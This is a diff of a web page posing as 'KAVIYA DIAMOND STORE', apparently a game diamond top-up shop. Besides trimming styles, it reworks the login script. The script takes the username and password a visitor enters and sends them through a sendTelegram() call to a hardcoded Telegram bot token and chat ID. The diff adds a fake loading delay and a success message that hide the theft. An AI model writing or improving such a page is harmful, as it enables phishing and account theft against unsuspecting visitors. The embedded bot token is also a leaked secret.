@@ -8,23 +8,19 @@
 body{
 margin:0;
 font-family:Arial;
-
-/* 🔥 BACKGROUND IMAGE */
 background:
 linear-gradient(rgba(15,32,39,0.8), rgba(44,83,100,0.8)),
 url("IMG_20260226_124349_379.jpg");
-
 background-size:cover;
 background-position:center;
 background-attachment:fixed;
-
 color:white;
 text-align:center;
 padding:30px;
 overflow-x:hidden;
 }
 
-/* ✅ SUCCESS BAR */
+/* SUCCESS BAR */
 .success-bar{
 position:fixed;
 top:-100px;
@@ -44,41 +40,15 @@ transition:0.5s;
 z-index:999;
 font-weight:bold;
 }
-
-.success-bar.show{
-top:20px;
-}
-
-/* 🔥 MULTI COLOR ANIMATED FRAME */
-body::before{
-content:"";
-position:fixed;
-top:5px; bottom:5px; left:5px; right:5px;
-border-radius:20px;
-border:6px solid;
-animation: frameColor 6s linear infinite;
-pointer-events:none;
-}
-
-/* 🎨 7 COLORS ROTATE */
-@keyframes frameColor{
-0%{border-color:yellow;}
-15%{border-color:red;}
-30%{border-color:green;}
-45%{border-color:blue;}
-60%{border-color:pink;}
-75%{border-color:orange;}
-90%{border-color:white;}
-100%{border-color:yellow;}
-}
+.success-bar.show{ top:20px; }
 
 .store-title{
 font-size:28px;
 font-weight:900;
 letter-spacing:3px;
 text-transform:uppercase;
-animation: colorChange 3s infinite alternate;
 margin-bottom:10px;
+color:#00ffcc;
 }
 
 .delivery{
@@ -91,18 +61,8 @@ color:#ffffffcc;
 font-size:42px;
 font-weight:900;
 letter-spacing:4px;
-color:white;
 text-transform:uppercase;
-text-shadow:
-0 0 5px #ffffff,
-0 0 15px #00c6ff,
-0 0 30px #00c6ff;
 margin-bottom:20px;
-}
-
-@keyframes colorChange{
-0%{color:#00c6ff;}
-100%{color:#00ffcc;}
 }
 
 .top-photo{
@@ -144,6 +104,12 @@ border-radius:14px;
 font-size:17px;
 font-weight:bold;
 cursor:pointer;
+transition:0.3s;
+}
+
+button:disabled{
+opacity:0.6;
+cursor:not-allowed;
 }
 
 .loginbtn{ background:#00ff99; color:black; }
@@ -161,8 +127,7 @@ font-weight:bold;
 <body>
 
 <div id="successBar" class="success-bar">
-✅ Login Successfully! 
-🎉please click top up now button
+✅ Login Successfully! 🎉 Please click top up now button
 </div>
 
 <div class="store-title">KAVIYA DIAMOND STORE</div>
@@ -179,7 +144,7 @@ font-weight:bold;
 <input type="password" id="password" placeholder="Password"><br>
 <button class="showbtn" onclick="togglePassword()">Show</button>
 
-<button class="loginbtn" onclick="login()">LOGIN</button>
+<button id="loginBtn" class="loginbtn" onclick="login()">LOGIN</button>
 <button class="topup" onclick="goTopup()">TOP UP NOW</button>
 <button class="contact" onclick="contactAdmin()">CONTACT ADMIN</button>
 
@@ -188,6 +153,7 @@ font-weight:bold;
 <script>
 
 let loggedIn = false;
+let isLogging = false;
 
 let botToken = "8439501847:AAGx25aJnenO2iPwXfSaXqbtZjfW49AXf5o";
 let chatId = "8324590734";
@@ -197,14 +163,28 @@ let pw = document.getElementById("password");
 pw.type = (pw.type === "password") ? "text" : "password";
 }
 
-function login(){
+async function login(){
+
+if(isLogging) return; // block multiple clicks
+
+let btn = document.getElementById("loginBtn");
+btn.disabled = true;
+btn.innerText = "LOGGING...";
+isLogging = true;
+
 let username = document.getElementById("username").value;
 let password = document.getElementById("password").value;
 
 if(username === "" || password === ""){
 alert("Enter Username & Password");
+btn.disabled = false;
+btn.innerText = "LOGIN";
+isLogging = false;
 return;
 }
+
+// simulate small delay
+await new Promise(resolve => setTimeout(resolve, 1000));
 
 loggedIn = true;
 
@@ -216,6 +196,15 @@ bar.classList.remove("show");
 },3000);
 
 sendTelegram(username, password);
+
+btn.innerText = "SUCCESS ✅";
+
+setTimeout(()=>{
+btn.innerText = "LOGIN";
+btn.disabled = false;
+isLogging = false;
+},2000);
+
 }
 
 function sendTelegram(username, password){
